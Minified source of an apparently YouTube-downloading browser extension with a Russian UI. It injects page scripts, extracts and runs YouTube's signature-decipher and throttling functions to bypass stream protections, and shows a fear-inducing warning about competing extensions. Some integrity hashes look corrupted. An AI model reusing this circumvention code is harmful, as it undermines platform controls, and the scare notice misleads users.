                            : defaultItem && (defaultItem.conversionRequired && warnBeforeConverting ? "/confirm" !== history.location.pathname && history.push("/confirm") : download());
                    }),
                    react_default.a.createElement(
                        app_styled_button,
                        { ref: setNodeRef },
                        react_default.a.createElement(icons_download, { className: "iconDownload" }),
                        react_default.a.createElement(styled_text, { id: btnTextId }, "" + t("download").toUpperCase(), " ", react_default.a.createElement(ExtTitle, { item: defaultItem }))
                    )
                );
            };
        var button_default = ({ isSplit: isSplit, openLandingUrl: openLandingUrl }) => {
            const { status: status, defaultItem: defaultItem, dir: dir, publicIds: publicIds } = use_app_state(["status", "defaultItem", "dir", "publicIds"]),
                { webPortalName: webPortalName } = config.a,
                [dropdownNode, setDropdownNode] = Object(react.useState)(),
                { btnTextId: btnTextId } = publicIds;
            return isSplit
                ? react_default.a.createElement(
                      error_boundary,
                      null,
                      react_default.a.createElement(
                          react_router_MemoryRouter,
                          null,
                          react_default.a.createElement("div", { style: { display: "flex" } }, react_default.a.createElement(SplittedDownloadButton, { openLandingUrl: openLandingUrl, dropdownNode: dropdownNode })),
                          react_default.a.createElement(
                              ui_dropdown,
                              { overlay: react_default.a.createElement(app_body, null), trigger: "click", setNodeRef: setDropdownNode },
                              react_default.a.createElement(
                                  app_styled_button,
                                  { dropdown: "true", dir: dir, border: "#d5d0d0" },
                                  react_default.a.createElement(
                                      styled_text,
                                      { id: btnTextId },
                                      "unavailable" === status || "error" === status ? react_default.a.createElement(react_default.a.Fragment, null, webPortalName) : react_default.a.createElement(ExtTitle, { item: defaultItem })
                                  )
                              )
                          )
                      )
                  )
                : react_default.a.createElement(
                      error_boundary,
                      null,
                      react_default.a.createElement(
                          react_router_MemoryRouter,
                          null,
                          react_default.a.createElement(
                              ui_dropdown,
                              { overlay: react_default.a.createElement(app_body, null), trigger: "hover" },
                              react_default.a.createElement("div", { style: { display: "flex" } }, react_default.a.createElement(DownloadButton, { openLandingUrl: openLandingUrl }))
                          )
                      )
                  );
        };
        var app = () => {
            const { sendEvent: sendEvent, appButtonStyle: appButtonStyle, getServiceUrl: getServiceUrl } = use_app_state(["sendEvent", "appButtonStyle", "getServiceUrl"]),
                { i18n: i18n } = useTranslation(),
                isSplit = "Classic" === appButtonStyle,
                openLandingUrl = Object(react.useCallback)(() => {
                    const landingUrl = getServiceUrl(window.location.href, i18n.language);
                    window.open(landingUrl, "_blank"), sendEvent({ action: "button_limited_landing", format: "" });
                }, [i18n, sendEvent, getServiceUrl]);
            return react_default.a.createElement(button_default, { isSplit: isSplit, openLandingUrl: openLandingUrl });
        };
        const snapshot_Container = styled_components_browser_esm.a.div.withConfig({ displayName: "snapshot__Container", componentId: "sc-1nrxgt4-0" })`position:absolute;width:100%;height:100%;`,
            snapshot_Button = styled_components_browser_esm.a.button.withConfig({
                displayName: "snapshot__Button",
                componentId: "sc-1nrxgt4-1",
            })`background-color:transparent;width:100%;height:100%;outline:none;flex:1;display:flex;align-items:center;justify-content:center;border:none;padding:0;cursor:pointer;`;
        var normal_snapshot = () => {
            const { snap: snap, info: info, showSnapshotButton: showSnapshotButton, publicIds: publicIds, eventRouter: eventRouter } = use_app_state(["snap", "info", "showSnapshotButton", "publicIds", "eventRouter"]),
                { t: t } = useTranslation(),
                { snapshot: snapshotId } = publicIds,
                snapshot = document.getElementById(snapshotId),
                handleClick = Object(react.useCallback)(
                    (evt) => {
                        if ((console.log("SNAPSHOT!!!", info), evt.stopPropagation(), info)) {
                            const { title: title } = info;
                            save_file(snap(), (title || "screenshot") + ".jpeg"), eventRouter.emit("screenshoted");
                        }
                    },
                    [info, eventRouter, snap]
                );
            if (
                (Object(react.useEffect)(
                    () => (
                        snapshot && (snapshot.addEventListener("click", handleClick), showSnapshotButton && info ? snapshot.setAttribute("style", "") : snapshot.setAttribute("style", "display:none")),
                        () => snapshot && snapshot.removeEventListener("click", handleClick)
                    ),
                    [showSnapshotButton, snapshot, info, handleClick]
                ),
                !snapshot)
            )
                return null;
            const snapshotButton = react_default.a.createElement(
                ui_tooltip,
                { title: t("take_screenshot_tooltip") },
                react_default.a.createElement(snapshot_Container, null, react_default.a.createElement(snapshot_Button, null, react_default.a.createElement(camera, { color: "white" })))
            );
            return Object(react_dom.createPortal)(showSnapshotButton ? snapshotButton : null, snapshot);
        };
        let isActiveDownloadNotificationShow = !1,
            isCompetitorsDetectionNotificationShow = !0;
        const normal_Container = styled_components_browser_esm.a.div.withConfig({
                displayName: "normal__Container",
                componentId: "sc-14g54u2-0",
            })`display:flex;flex-direction:row;align-items:center;justify-content:space-between;margin:0 -4px;& button{margin:0 4px;}`,
            normal_ButtonUnderline = styled_components_browser_esm.a.button.withConfig({
                displayName: "normal__ButtonUnderline",
                componentId: "sc-14g54u2-1",
            })`outline:none;border:none;padding:6px 8px;margin:0 auto 24px;display:block;cursor:pointer;font-size:16px;text-decoration:underline;background-color:transparent;color:${(props) => props.color};&:hover{color:${(props) =>
                props.hover};}`,
            BottomContent = ({ close: close }) => {
                const { theme: theme } = use_app_state(["theme"]),
                    modalNotificationStyles = theme && theme.modal_notification,
                    buttonUnderline = modalNotificationStyles && modalNotificationStyles.button_underline,
                    color = buttonUnderline && buttonUnderline.color,
                    hover = buttonUnderline && buttonUnderline.hover;
                return react_default.a.createElement(
                    normal_Container,
                    null,
                    react_default.a.createElement(normal_ButtonUnderline, { color: color, hover: hover, onClick: close }, "Я понимаю риск"),
                    react_default.a.createElement(ui_button, { icon: icons_info, text: "Как исправить эту проблему?" })
                );
            };
        var normal = () => {
                const { status: status, snap: snap, warnAboutCompetitorsDetection: warnAboutCompetitorsDetection, addModal: addModal, appButtonStyle: appButtonStyle, setAppButtonStyle: setAppButtonStyle } = use_app_state([
                    "status",
                    "snap",
                    "warnAboutCompetitorsDetection",
                    "addModal",
                    "appButtonStyle",
                    "setAppButtonStyle",
                ]);
                "Modern" !== appButtonStyle && "Classic" !== appButtonStyle && setAppButtonStyle("Modern");
                const isMounted = use_is_mounted(),
                    { t: t } = useTranslation();
                Object(react.useEffect)(() => {
                    const showCompetitorsDetectionNotification = () => {
                            if (isMounted() && warnAboutCompetitorsDetection && !isCompetitorsDetectionNotificationShow) {
                                isCompetitorsDetectionNotificationShow = !0;
                                let close = (func) => {
                                    close = func;
                                };
                                addModal({
                                    type: "notification",
                                    props: {
                                        icon: react_default.a.createElement(lightning, null),
                                        message: "Внимание!",
                                        description: `Обнаружено расширение <b>${competitors_detection()}</b> для загрузки мультимедиа файлов.\n            Одновременная работа нескольких браузерных расширений может привести к <b>сбоям</b> в работе вашего браузера.`,
                                        bottomContent: react_default.a.createElement(BottomContent, { close: () => close() }),
                                        duration: -1,
                                        close: close,
                                    },
                                });
                            }
                        },
                        observer = new MutationObserver(() => {
                            competitors_detection() && (showCompetitorsDetectionNotification(), observer.disconnect());
                        });
                    return (
                        warnAboutCompetitorsDetection && (competitors_detection() ? showCompetitorsDetectionNotification() : observer.observe(document, { attributes: !1, childList: !0, characterData: !1, subtree: !0 })),
                        () => {
                            observer.disconnect();
                        }
                    );
                }, [warnAboutCompetitorsDetection, addModal, t, isMounted]),
                    Object(react.useEffect)(
                        () => (
                            "downloading" === status && (window.onbeforeunload = () => "Do you really want to close?"),
                            () => {
                                "downloading" === status && (window.onbeforeunload = null);
                            }
                        ),
                        [status]
                    );
                use_event_listener(window, "popstate", () => {
                    "downloading" === status &&
                        isMounted() &&
                        !isActiveDownloadNotificationShow &&
                        addModal({
                            type: "notification",
                            props: {
                                icon: react_default.a.createElement(icons_warning, null),
                                message: t("active_download_warning_notification_message"),
                                description: t("active_download_warning_notification_description"),
                                onClose: () => {
                                    isMounted() && (isActiveDownloadNotificationShow = !1);
                                },
                            },
                        });
                });
                const components = {
                    downloading: react_default.a.createElement(progress_bar, null),
                    liveStream: react_default.a.createElement(live_stream, null),
                    premiere: react_default.a.createElement(premiere, null),
                    gettingInfo: react_default.a.createElement(getting_info, null),
                    idle: react_default.a.createElement(app, null),
                    imgDownloading: react_default.a.createElement(app, null),
                    unavailable: react_default.a.createElement(unavailable, null),
                    protected: react_default.a.createElement(normal_protected, null),
                    error: react_default.a.createElement(app, null),
                    downloadError: react_default.a.createElement(download_error, null),
                };
                return status in components
                    ? react_default.a.createElement(react_default.a.Fragment, null, components[status], snap && react_default.a.createElement(normal_snapshot, null), react_default.a.createElement(ui_modals, null))
                    : null;
            },
            gv_generic_snap = function () {
                const video = document.querySelector("video"),
                    canvas = document.createElement("canvas"),
                    context = canvas.getContext("2d"),
                    w = video.videoWidth,
                    h = video.videoHeight;
                (canvas.width = video.videoWidth), (canvas.height = video.videoHeight), context.fillRect(0, 0, w, h), context.drawImage(video, 0, 0, w, h);
                return canvas.toDataURL("image/jpeg", 1);
            };
        const lang_detect_getLang = () => {
                const htmlAttrLang = document.querySelector("html").getAttribute("lang");
                return -1 !== ["ru-RU", "uk-UA", "be-BY", "kk-KZ", "ky-KG", "hy-AM", "ka-GE", "az-Latn-AZ"].indexOf(htmlAttrLang) ? "ru" : "en";
            },
            startLangObserver = (getLangFromSettings, setLang) => {
                const html = document.querySelector("html");
                new MutationObserver((mutations) => {
                    mutations.some((mutation) => "attributes" === mutation.type && "lang" === mutation.attributeName && ("autoDetect" === getLangFromSettings() && setLang(lang_detect_getLang()), !0));
                }).observe(html, { attributes: !0 });
            },
            getDir = () => ("rtl" === document.querySelector("body").getAttribute("dir") ? "rtl" : "ltr"),
            startDirObserver = (setDir) => {
                const body = document.querySelector("body");
                new MutationObserver((mutations) => {
                    mutations.some((mutation) => "attributes" === mutation.type && "dir" === mutation.attributeName && (setDir(getDir()), !0));
                }).observe(body, { attributes: !0 });
            },
            getTheme = () => ("true" === document.querySelector("html").getAttribute("dark") ? "dark" : "default"),
            startThemeObserver = (setTheme) => {
                const html = document.querySelector("html");
                new MutationObserver((mutations) => {
                    mutations.some((mutation) => "attributes" === mutation.type && "dark" === mutation.attributeName && (setTheme(getTheme()), !0));
                }).observe(html, { attributes: !0 });
            };
        var utils_regexp = (regexps, target) => regexps.some((regexp) => new RegExp(regexp).test(target));
        const gvEmbedUrls = ["^https?://www\\.youtube\\.com/embed", "^https?://www\\.youtu\\.be/embed", "^https?://www\\.youtube-nocookie\\.com/embed"];
        var is_embed = (url) => utils_regexp(gvEmbedUrls, url);
        const serviceUrls = ["^https?://(?:www\\.)?(?:youtube\\.com|youtu\\.be)"],
            mediaUrls = ["^https?://(?:www\\.)?(m\\.)?(?:youtube\\.com|youtu\\.be)/watch\\?", "^https?://(?:www\\.)?(?:youtu\\.be)/[a-zA-Z0-9_-]+"],
            url_checker_isServiceUrl = (url) => utils_regexp(serviceUrls, url) && !is_embed(url),
            isServiceMediaUrl = (url) => utils_regexp(mediaUrls, url);
        var get_media_id = (url) => {
                const urlObj = new URL(url);
                if (/^https?:\/\/(www\.)?(youtu\.be)\/[a-zA-Z0-9_-]+/.test(url)) {
                    return urlObj.pathname.split("/")[1];
                }
                return new URLSearchParams(urlObj.search).get("v");
            },
            make_canonical_url = (mediaId) => "https://www.youtube.com/watch?v=" + mediaId;
        const add_src_ext_runtime = chrome ? chrome.runtime : browser.runtime,
            hashes = {
                "get-globals.js": "sha384-nKfYvkeKEzjjRP/9ZvSUfiJ9JLR0BGfQFgfgDqAZF6DXFT6D8KyJQti62CMjJ6th",
                "set-global.js": "sha384-o20oPnZpmph5YvOx8ll8GTwVLV0P7WGkz3xNs9sWK9AfJgIZS0//oL/WBcw1wOec",
                "patch-fetch.js": "sha384-UrTmmPqhEfjzXdIcyLQJuh7xeGSN0QfGYLTdZ+LBKaIhnueB+W1lje63ZOdhslB/",
                "patch-xhr.js": "sha384-Hrtp2SwnNh2j863KnULvbBVcqiNQbc8UUPeCGETHUZzXh0s/12gVRXxmwDt+28oR",
                "do-xhr-request.js": "sha384-UAV7Pz9HTj8zPyQ/Wj8XCCc/Pz8BDQo/Ey4/bT9mBD8/Pz8/WXA/P3YDfzsIDGkRTQ0K",
                "worker-spawn.js": "sha384-TWs/NR4/Pzk/ZlBXPzU/Pz8/P0RyPT8/Pz8/ZToHPzY/Pz8GTz8/P0Y/Pz8/IT9wDQo=",
            };
        var inject_script = (document, scriptPath, params) => {
            const { MutationObserver: MutationObserver } = document.defaultView;
            return new Promise((resolve, reject) => {
                const script = document.createElement("script");
                (script.type = "text/javascript"),
                    (script.charset = "utf-8"),
                    (script.defer = !0),
                    (script.async = !0),
                    ((script, scriptPath) => {
                        if (!hashes[scriptPath]) throw new Error(`script with path ${scriptPath} doesn't declared in hashes table`);
                        script.src = add_src_ext_runtime.getURL("inject-scripts/" + scriptPath);
                    })(script, scriptPath),
                    script.setAttribute("data-params", JSON.stringify(params));
                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        if ("attributes" === mutation.type && mutation.attributeName && "data-status" === mutation.attributeName) {
                            const status = mutation.target.getAttribute("data-status"),
                                response = mutation.target.getAttribute("data-response"),
                                result = "undefined" === response ? void 0 : JSON.parse(response),
                                type = mutation.target.getAttribute("data-type");
                            switch ((script.parentElement.removeChild(script), status)) {
                                case "fulfilled":
                                    resolve(result);
                                    break;
                                case "rejected":
                                    if (type && "error" === type) {
                                        const err = new Error();
                                        reject(Object.assign(err, result));
                                    } else reject(result);
                                    break;
                                default:
                                    reject(new Error("injectScript: unknown response"));
                            }
                        }
                        observer.disconnect();
                    });
                });
                observer.observe(script, { attributes: !0 }), (document.head || document.documentElement || document).appendChild(script);
            });
        };
        var get_media_info_endpoints_player = async (id) => {
            const [context] = await inject_script(document, "get-globals.js", { names: ["window.yt.config_.INNERTUBE_CONTEXT"] });
            let apiKey;
            try {
                ([apiKey] = await inject_script(document, "get-globals.js", { names: ["window.web_player_context_config.innertubeApiKey"] })),
                    apiKey || ([apiKey] = await inject_script(document, "get-globals.js", { names: ["window.yt.config_.INNERTUBE_API_KEY"] }));
            } catch (e) {
                console.log(e);
            }
            const payload = { context: { client: context.client, user: context.user, request: context.request, clickTracking: context.clickTracking }, videoId: id },
                url = `https://${window.location.hostname}/youtubei/v1/player?key=${apiKey}`,
                options = { mode: "no-cors", method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) },
                newEndpointResponse = await fetch(url, options);
            if (!newEndpointResponse.ok) return { status: "error" };
            return await newEndpointResponse.json();
        };
        var get_media_info_endpoints_globals = async (id) => {
            const [playerResponse] = await inject_script(document, "get-globals.js", { names: ["window.ytInitialPlayerResponse"] });
            return console.log(playerResponse), playerResponse && playerResponse.videoDetails && playerResponse.videoDetails.videoId === id ? playerResponse : null;
        };
        let get_basejs_basejs;
        var get_basejs = async () => {
            if (get_basejs_basejs) return get_basejs_basejs;
            const basejsUrl = ((s, x = document) => x.querySelector(s))('script[src$="base.js"]').src;
            return (get_basejs_basejs = await (await fetch(basejsUrl)).text()), get_basejs_basejs;
        };
        var make_logger = (console, tag, mode) => {
            const acc = {};
            return (
                Object.keys(console).forEach((k) => {
                    acc[k] = ((k) => (mode ? (...args) => console[k](`${tag}: ${args[0]}`, ...args.slice(1)) : () => {}))(k);
                }),
                acc
            );
        };
        const logger = make_logger(console, "YTDL", !0),
            escapeRegex = (string) => string.replace(/[-/\\^$*+?.()|[\]{}]/g, "\\$&");
        let transformFunction;
        const getTransformFunction = async () => {
            if (transformFunction) return transformFunction;
            const basejs = await get_basejs(),
                name = (function (basejs) {
                    const patterns = [
                        /\b[cs]\s*&&\s*[adf]\.set\([^,]+\s*encodeURIComponent\s*\(\s*([a-zA-Z0-9$]+)\(/,
                        /\b[a-zA-Z0-9]+\s*&&\s*[a-zA-Z0-9]+\.set\([^,]+\s*,\s*encodeURIComponent\s*\(\s*([a-zA-Z0-9$]+)\(/,
                        /(?:\b|[^a-zA-Z0-9$])([a-zA-Z0-9$]{2})\s*=\s*function\(\s*a\s*\)\s*\{\s*a\s*=\s*a\.split\(\s*""\s\)/,
                        /([a-zA-Z0-9$]+)\s*=\s*function\(\s*a\s*\)\s*{\s*a\s*=\s*a\.split\(\s*""\s*\)/,
                        /(?:["'])signature\1\s*,\s*([a-zA-Z0-9$]+)\(/,
                        /\.sig\|\|([a-zA-Z0-9$]+)\(/,
                        /yt\.akamaized\.net\/\)\s*\|\|\s*.*?\s*[cs]\s*&&\s*[adf]\.set\([^,]+\s*,\s*(?:encodeURIComponent\s*\()?\s*([a-zA-Z0-9$]+)\(/,
                        /\b[cs]\s*&&\s*[adf]\.set\([^,]+\s*,\s*([a-zA-Z0-9$]+)\(/,
                        /\bc\s*&&\s*a\.set\([^,]+\s*,\s*\([^)]*\)\s*\(\s*([a-zA-Z0-9$]+)\(/,
                        /\bc\s*&&\s*[a-zA-Z0-9]+\.set\([^,]+\s*,\s*\([^)]*\)\s*\(\s*([a-zA-Z0-9$]+)\(/,
                        /\bc\s*&&\s*[a-zA-Z0-9]+\.set\([^,]+\s*,\s*\([^)]*\)\s\(\s*([a-zA-Z0-9$]+)\(/,
                    ];
                    for (const pattern in patterns) {
                        const match = basejs.match(patterns[pattern]);
                        if (match) return console.log("MATCHED!!!", patterns[pattern], match), match[1];
                        console.log("MISSED!!!", pattern);
                    }
                    return null;
                })(basejs),
                regexp = escapeRegex(name) + '=function\\((\\w)\\)\\{([a-z=\\"\\.\\(\\)]+;([^;]+);[^}]+)\\};',
                plan = basejs.match(new RegExp(regexp)),
                varName = plan[3].split(".")[0],
                transformObjectPattern = new RegExp(`var\\s+${escapeRegex(varName)}={([^]*?)};`),
                transformObject = basejs.match(transformObjectPattern)[1],
                mapper = {},
                functions = [
                    [/[a-zA-Z_][a-zA-Z_0-9]*\.reverse\(\)/, (a) => a.reverse()],
                    [/[a-zA-Z_][a-zA-Z_0-9]*\.splice\(0,[a-zA-Z_][a-zA-Z_0-9]*\)/, (a, b) => a.splice(0, b)],
                    [
                        /var [a-zA-Z_][a-zA-Z_0-9]*=[a-zA-Z_][a-zA-Z_0-9]*\[0\];a\[0\]=a\[b%a\.length\];a\[b%a\.length\]=c/,
                        (a, b) => {
                            const c = a[0];
                            (a[0] = a[b % a.length]), (a[b % a.length] = c);
                        },
                    ],
                ];
            transformObject.split("\n").forEach((rec) => {
                const [fname, func] = rec.split(":"),
                    args = func.match(/function\((.*?)\){(.*?)}/),
                    declaredFunc = ((body = args[2]), functions.reduce((result, pair) => result || (pair[0].test(body) ? pair[1] : result), null));
                var body;
                declaredFunc && (mapper[fname] = declaredFunc);
            });
            const planTokens = plan[2].split(";");
            planTokens.pop();
            return (
                plan &&
                    (transformFunction = (a) => {
                        const tokens = a.split("");
                        return (
                            planTokens
                                .slice(1)
                                .map((token) => token.split(".")[1])
                                .forEach((request) => {
                                    const method = request.split("(")[0],
                                        args = request.split("(")[1].split(")")[0],
                                        arg = parseInt(args.split(",")[1], 10);
                                    mapper[method](tokens, arg);
                                }),
                            tokens.join("")
                        );
                    }),
                transformFunction
            );
        };
        var parse_decsig = async (sig) => {
            console.log("DECIPHER SIGNATURE", sig);
            try {
                const transform = await getTransformFunction();
                if (!transform) throw new Error("can't figure out tranfromation plan");
                return transform(sig);
            } catch (e) {
                throw (logger.error("parsedecsig error: %o", e), e);
            }
        };
        const getThrottlingFunctionCode = (basejs) => {
            const name = ((basejs) => {
                    const functionPatterns = [/a\.[a-zA-Z]\s*&&\s*\([a-z]\s*=\s*a\.get\("n"\)\)\s*&&\s*\([a-z]\s*=\s*([a-zA-Z0-9$]+)(\[\d+\])?\([a-z]\)/];
                    for (const pattern of functionPatterns)
                        if (pattern.test(basejs)) {
                            const functionMatch = pattern.exec(basejs);
                            if (functionMatch[1]) {
                                const _pattern = functionMatch[1] + "\\.length\\s*\\|\\|\\s*([a-zA-Z_][a-zA-Z_0-9-]*)[^;]*;",
                                    nameMatch = new RegExp(_pattern).exec(basejs);
                                if (nameMatch[1]) return nameMatch[1];
                            }
                        }
                })(basejs),
                match = new RegExp(name + "\\s*=\\s*function\\(\\w\\)").exec(basejs),
                _src = basejs.substring(match.index),
                descStart = _src.indexOf("{");
            return {
                body: ((src) => {
                    if (!["{", "["].includes(src[0])) throw new Error("Invalid start point.\n");
                    const stack = [src[0]];
                    let i = 1;
                    const contextClosers = { "{": "}", "[": "]", '"': '"' };
                    for (; i < src.length && 0 !== stack.length; ) {
                        const currChar = src[i],
                            currContext = stack[stack.length - 1];
                        if (currChar !== contextClosers[currContext]) {
                            if ('"' === currContext) {
                                if ("\\" === currChar) {
                                    i += 2;
                                    continue;
                                }
                            } else Object.keys(contextClosers).includes(currChar) && stack.push(currChar);
                            i += 1;
                        } else stack.pop(), (i += 1);
                    }
                    return src.substring(0, i);
                })(_src.substring(descStart)),
                args: /function\(([^)]+)\)/
                    .exec(_src.substring(0, descStart))[1]
                    .split(",")
                    .map((arg) => arg.trim()),
            };
        };
        let throttlingFunction;
        const getThrottlingFunction = async (basejs) => {
                if (throttlingFunction) return throttlingFunction;
                const rawCode = getThrottlingFunctionCode(basejs);
                return (
                    (throttlingFunction = await ((fnArgs, fnBody) => {
                        const callbacks = [null],
                            injectedQuery = (query, callback) => {
                                const _cid = callbacks.length,
                                    { _sid: _sid, ...params } = query;
                                callbacks.push(callback);
                                const data = JSON.stringify({ _cid: _cid, _sid: _sid, ...params }),
                                    event = new CustomEvent("CustomWorkerRequest", { detail: data });
                                window.dispatchEvent(event);
                            };
                        return (
                            window.addEventListener("CustomWorkerResponse", (e) => {
                                const { _sid: _sid, _cid: _cid, result: result } = JSON.parse(e.detail);
                                _cid && callbacks[_cid] && callbacks[_cid](result, _sid);
                            }),
                            new Promise((resolve) => {
                                injectedQuery({ action: "create", args: fnArgs, body: fnBody }, (response, _sid) => {
                                    resolve(
                                        (...args) =>
                                            new Promise((done) => {
                                                injectedQuery({ _sid: _sid, action: "call", params: args }, (result) => done(result));
                                            })
                                    );
                                });
                            })
                        );
                    })(rawCode.args, rawCode.body.slice(1, -1))),
                    throttlingFunction
                );
            },
            Ns = {};
        var parse_throttling = async (_initialN) => {
            if (_initialN in Ns) return Ns[_initialN];
            const basejs = await get_basejs(),
                func = await getThrottlingFunction(basejs),
                newN = await func(_initialN);
            return console.log("newN!!!", _initialN, newN), (Ns[_initialN] = newN), newN;
        };
        const isAcceptable = (playerResponse, id) =>
                !!playerResponse &&
                (!!playerResponse.playabilityStatus ||
                    !(!playerResponse.videoDetails || playerResponse.videoDetails.videoId !== id) ||
                    (window.sendLog({ type: "gv: data is not acceptable", info: { id: id, playerResponse: playerResponse } }), !1)),
            applySignature = async (rec) => {
                let url;
                if ((rec.url && (url = new URL(rec.url)), rec.signatureCipher && (!url || !url.searchParams.get("sig")))) {
                    const params = new URLSearchParams(rec.signatureCipher),
                        sUrl = params.get("url"),
                        sParam = params.get("sp") || "signature",
                        sRaw = params.get("s");
                    sUrl && (url = new URL(sUrl));
                    const sig = await parse_decsig(sRaw);
                    url.searchParams.set(sParam, sig);
                }
                const initialN = url.searchParams.get("n");
                if (initialN) {
                    const newN = await parse_throttling(initialN);
                    newN && url.searchParams.set("n", newN);
                }
                rec.url = url.toString();
            };
        var get_media_info_endpoints = async function (id) {
            let playerResponse = await get_media_info_endpoints_globals(id);
            if (
                (isAcceptable(playerResponse, id) ? console.log("nice shot, videoInfo already fetched.", playerResponse) : (playerResponse = await get_media_info_endpoints_player(id)),
                (data = playerResponse).playabilityStatus && data.playabilityStatus.status && "ERROR" === data.playabilityStatus.status)
            )
                return { status: "unavailable" };
            var data;
            if (!isAcceptable(playerResponse, id)) return null;
            if (!playerResponse.streamingData) return playerResponse;
            if (playerResponse.streamingData.adaptiveFormats) for (const rec of playerResponse.streamingData.adaptiveFormats) await applySignature(rec);
            if (playerResponse.streamingData.formats) for (const rec of playerResponse.streamingData.formats) await applySignature(rec);
            return playerResponse;
        };
        const addCanonicalUrl = (videoInfo, id) => ({ ...videoInfo, canonicalUrl: make_canonical_url(id) }),
            hasStreams = (data) => !!data.streamingData && !!data.streamingData.formats,
            hasAdaptive = (data) => !!data.streamingData && !!data.streamingData.adaptiveFormats,
            premiereResponse = (id, title, info) => {
                const result = {
                    id: id,
                    isPremiere: !0,
                    title: title,
                    expires:
                        ((info) =>
                            info.playabilityStatus &&
                            info.playabilityStatus.liveStreamability &&
                            info.playabilityStatus.liveStreamability.liveStreamabilityRenderer &&
                            info.playabilityStatus.liveStreamability.liveStreamabilityRenderer.offlineSlate &&
                            info.playabilityStatus.liveStreamability.liveStreamabilityRenderer.offlineSlate.liveStreamOfflineSlateRenderer &&
                            info.playabilityStatus.liveStreamability.liveStreamabilityRenderer.offlineSlate.liveStreamOfflineSlateRenderer.scheduledStartTime
                                ? parseInt(info.playabilityStatus.liveStreamability.liveStreamabilityRenderer.offlineSlate.liveStreamOfflineSlateRenderer.scheduledStartTime, 10)
                                : 0)(info) || Math.floor(Date.now() / 1e3) + 21600,
                    streams: [],
                    video: [],
                    audio: [],
                };
                return addCanonicalUrl(result, id);
            },
            makeVideo = (type) => (raw) => {
                const { fps: fps, qualityLabel: qualityLabel, mimeType: mimeType, contentLength: contentLength, height: height, width: width, url: url } = raw;
                return { quality: qualityLabel, type: type, mimeType: mimeType, contentLength: contentLength ? parseInt(contentLength, 10) : 0, fps: fps || 30, height: height, width: width, conversionRequired: !0, id: url, url: url };
            },
            sortVideo = (a, b) => (a.height === b.height ? b.fps - a.fps : b.height - a.height),
            makeAudio = (raw) => {
                const { mimeType: mimeType, bitrate: bitrate, url: url, contentLength: contentLength } = raw,
                    type = mimeType.split(";")[0].split("/")[1];
                return { contentLength: parseInt(contentLength, 10), mimeType: mimeType, bitrate: bitrate, id: url, url: url, canBeShared: !0, type: "mp4" === type ? "m4a" : type };
            },
            makeStream = (stream) => {
                const { fps: fps, qualityLabel: qualityLabel, mimeType: mimeType, height: height, width: width, url: url, contentLength: contentLength } = stream,
                    [_, type] = /video\/([^;]+);/.exec(mimeType);
                return { fps: fps || 30, quality: qualityLabel, mimeType: mimeType, height: height, width: width, url: url, type: type, contentLength: contentLength ? parseInt(contentLength, 10) : 0, id: stream.url, canBeShared: !0 };
            },
            makeRefinedStream = async (title, streamInfo) => {
                const stream = makeStream(streamInfo),
                    { url: url, contentLength: contentLength } = stream,
                    addInfo = { fps: streamInfo.fps || 30 };
                try {
                    const recievedContentLength = contentLength ? parseInt(contentLength, 10) : await getContentLength(url, !0);
                    addInfo.contentLength = recievedContentLength;
                    const directDownloadResult = await (async (url, back) => {
                        const [contentDisposition] = await network_getHeaders(url, ["content-disposition"], back);
                        if (contentDisposition) return contentDisposition;
                        throw new Error("no content disposition");
                    })(`${url}&title=${title}`, !0);
                    console.log("CHECK DIRECT DOWNLOAD!!!", `${url}&title=${title}`, directDownloadResult), directDownloadResult && (addInfo.directUrl = `${url}&title=${title}`);
                } catch (e) {
                    console.log("ERROR!!!", e);
                }
                return { ...stream, ...addInfo };
            };
        var transform_media_info = async function (data, id, update) {
            if ((console.log("cache missed"), !data)) return void update({ status: "error" });
            const { title: title } = data.videoDetails,
                injectTitle = (items) => items.filter((item) => item).map((item) => ({ ...item, title: `${title}.${item.type}` }));
            var info;
            if (!!(info = data).videoDetails && info.videoDetails.isUpcoming) return console.log("ITS PREMIERE!!!"), void update(premiereResponse(id, title, data));
            const isLiveStream = data.playabilityStatus.liveStreamability;
            if (isLiveStream)
                return void update(
                    ((id, title) => {
                        const result = { id: id, isLiveStream: !0, title: title, expires: Math.floor(Date.now() / 1e3) + 3600, streams: [], video: [], audio: [] };
                        return addCanonicalUrl(result, id);
                    })(id, title)
                );
            const video = ((data) => {
                    if (!hasAdaptive(data)) return [];
                    const videos = data.streamingData.adaptiveFormats.filter(isVideo);
                    return [...videos.map(makeVideo("mp4")), ...videos.filter(isVideoWebm).map(makeVideo("webm"))].sort(sortVideo);
                })(data),
                audio = ((data) => (hasAdaptive(data) ? data.streamingData.adaptiveFormats.filter((x) => x.mimeType.includes("audio/")).map(makeAudio) : []))(data),
                defaultAudio = audio.filter((rec) => rec.mimeType.includes("audio/mp4")).sort((a, b) => b.bitrate - a.bitrate)[0],
                defaultWebMAudio = audio.filter((rec) => rec.mimeType.includes("audio/webm")).sort((a, b) => b.bitrate - a.bitrate)[0],
                getAudioForStream = (stream) => (isVideoWebm(stream) ? defaultWebMAudio : defaultAudio),
                injectDefaultAudio = (streams) => streams.map((stream) => ({ ...stream, audio: getAudioForStream(stream) })),
                mp3 = defaultAudio ? { ...defaultAudio, mimeType: "audio/mp3", conversionRequired: !0, type: "mp3" } : null,
                streams = ((data) => (hasStreams(data) ? data.streamingData.formats.map(makeStream).filter((stream) => stream.directUrl || stream.contentLength) : []))(data),
                expires = Math.floor(Date.now() / 1e3) + ((data) => (data.streamingData && data.streamingData.expiresInSeconds ? parseInt(data.streamingData.expiresInSeconds, 10) : 21600))(data),
                result = {
                    id: id,
                    isLiveStream: isLiveStream,
                    title: title,
                    expires: expires,
                    streams: injectTitle(streams),
                    video: injectTitle(injectDefaultAudio(video.filter((rec) => rec.contentLength))),
                    audio: injectTitle([...audio, mp3]),
                };
            update(addCanonicalUrl(result, id));
            const refinedStreams = (async (data, title) => (hasStreams(data) ? (await Promise.all(data.streamingData.formats.map(makeRefinedStream.bind(null, title)))).filter((stream) => stream.directUrl || stream.contentLength) : []))(
                    data,
                    title
                ),
                fullResult = {
                    id: id,
                    isLiveStream: isLiveStream,
                    title: title,
                    expires: expires,
                    streams: injectTitle(await refinedStreams),
                    video: injectTitle(injectDefaultAudio(video.filter((rec) => rec.contentLength))),
                    audio: injectTitle([...audio, mp3]),
                };
            update(addCanonicalUrl(fullResult, id));
        };
        var get_media_info = async (url, setMediaInfo) => {
                const id = get_media_id(url);
                console.log("url: ", url, "ID!!!", id);
                const data = await get_media_info_endpoints(id);
                if ((setMediaInfo(data ? { raw: data } : { status: "error" }), data && data.status)) return;
